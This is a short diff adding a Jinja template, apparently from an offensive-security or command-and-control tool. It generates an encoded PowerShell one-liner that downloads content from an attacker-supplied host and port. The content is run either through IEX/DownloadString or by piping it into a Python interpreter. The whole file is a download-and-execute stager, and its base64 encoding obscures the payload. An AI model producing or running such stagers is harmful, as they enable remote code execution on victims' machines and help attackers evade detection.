@@ -1,0 +1,15 @@
+{% set url = 'http://{}{}{}'.format(
+    rhost, ':{}'.format(rport) if rport != 80 else '', path) %}
+
+{% set script %}
+    {%- if interpreter.startswith('python') -%}
+        IWR -Uri '{{ url }}' -UseBasicParsing | {{ '' -}}
+            Select-Object -ExpandProperty Content | {{ '' -}}
+            {{ interpreter }}.exe -
+    {%- else -%}
+        IEX(New-Object System.Net.WebClient).DownloadString('{{ url }}')
+    {%- endif -%}
+{% endset %}
+
+powershell.exe -enc {{ script|powershell_encode }}
+
